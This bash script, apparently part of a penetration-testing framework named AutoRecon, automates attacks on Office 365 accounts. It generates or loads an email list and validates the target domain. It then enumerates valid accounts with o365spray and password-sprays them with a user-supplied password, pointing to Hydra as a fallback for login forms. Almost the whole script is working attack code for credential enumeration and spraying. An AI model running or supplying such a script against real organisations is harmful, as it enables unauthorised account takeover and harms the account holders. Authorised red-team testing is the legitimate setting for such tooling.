source /opt/AutoRecon/scripts/functions.sh
source /opt/AutoRecon/Variables/GVar.sh
source $home/workspaces/$workspace/Var/WorkspaceVars.sh
clear
echo "Email enumeration/validation/Spray"

read -p "Do you already have an email list? " -n 1 -r
echo
if [[ $REPLY =~ ^[Nn]$ ]];
then
GenerateEmailList
fi

read -p "Would you like to Continue to Validation/spray(Active/Bruteforce): " -n 1 -r
echo    # (optional) move to a new line
if [[ ! $REPLY =~ ^[Yy]$ ]];
then
	    /opt/AutoRecon/scripts/WorkspaceMenu
	    exit
fi

echo "Validating Domain"

emaildomain=$(head -1 $home/workspaces/$workspace/Users/emails/EmailList.txt | grep -o "@.*" | sed 's/@//')
python3 $o365spraydir -d $emaildomain --validate

read -p "Is the domain valid? :" -n 1 -r 
echo 
if [[ $reply =~ ^[Nn]$ ]]
then
	echo "Will require the use of Hydra to target email login form"
	read -n 1 -r -s -p "Press any key to return to main Menu" key
	/opt/AutoRecon/scripts/WorkspaceMenu.sh
	exit
fi

echo "Validating email list"

python3 $o365spraydir -d $emaildomain --enum -U $home/workspaces/$workspace/Users/EmailList.txt --output $home/workspaces/$workspace/Users/
validaccountfile=$(ls $home/workspaces/$workspace/Users | grep -E "enum_valid*")

echo "setting up password spray" 
read -p "Please enter a password to use: " password

python3 $o365spray -d $emaildomain --spray -U $home/workspaces/$workspace/Users/$validaccountfile -p $password --output $home/workspaces/$workspace/Users/emails/spray

echo "Password spray finished and saved to: $workspace/Users/"
echo "returning to main menu" 
/opt/AutoRecon/scripts/WorkspaceMenu.sh






